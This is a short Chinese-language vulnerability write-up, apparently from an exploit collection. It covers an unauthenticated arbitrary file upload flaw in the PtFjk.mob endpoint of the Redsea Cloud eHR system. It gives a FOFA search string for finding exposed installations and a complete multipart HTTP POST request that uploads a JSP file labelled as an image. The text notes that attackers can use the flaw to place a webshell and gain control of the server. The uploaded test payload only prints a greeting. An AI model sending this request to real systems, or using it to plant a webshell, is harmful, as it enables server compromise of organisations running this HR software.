## 红海云eHR-PtFjk.mob存在任意文件上传漏洞

红海云EHR系统PtFjk.mob接口处存在未授权文件上传漏洞，攻击者可上传webshell来命令执行，获取服务器权限。

## fofa
```
body="/RedseaPlatform/skins/images/favicon.ico"
```


## poc
```
POST /RedseaPlatform/PtFjk.mob?method=upload HTTP/1.1
Host: 
Accept-Encoding: gzip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt7WbDl1tXogoZys4

------WebKitFormBoundaryt7WbDl1tXogoZys4
Content-Disposition: form-data; name="fj_file"; filename="11.jsp"
Content-Type:image/jpeg

<% out.print("hello,eHR");%>
------WebKitFormBoundaryt7WbDl1tXogoZys4--
```
